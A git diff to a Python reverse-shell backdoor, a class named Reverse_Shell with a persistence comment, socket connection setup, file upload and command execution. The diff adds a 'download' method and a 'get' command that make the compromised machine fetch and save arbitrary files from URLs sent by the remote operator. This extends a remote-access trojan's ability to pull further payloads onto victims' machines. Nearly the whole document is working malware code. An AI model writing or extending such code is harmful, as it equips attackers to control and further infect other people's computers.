@@ -6,6 +6,7 @@ import os
 import shutil
 import sys
 import base64
+import requests
 
 
 # for persistance:
@@ -32,6 +33,12 @@ class Reverse_Shell:
                 return json.loads(json_data)
             except ValueError:
                 continue
+
+    def download(self, url):
+        get_reponse = requests.get(url)
+        file_name = url.split("/")[-1]
+        with open(file_name, "wb") as out_file:
+            out_file.write(get_reponse.content)
 
     def initialisation(self):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -64,6 +71,12 @@ class Reverse_Shell:
                 with open(command[7:],"wb") as fin:
                     result = self.reliable_receive()
                     fin.write(base64.b64decode(result))
+            elif command[:3] == "get":
+                try:
+                    self.download(command[4:])
+                    self.reliable_send("[+] Download File From the URL")
+                except:
+                    self.reliable_send("[-] Failed to Download File")
             else:
                 try:
                     # creation of the command, see documentation
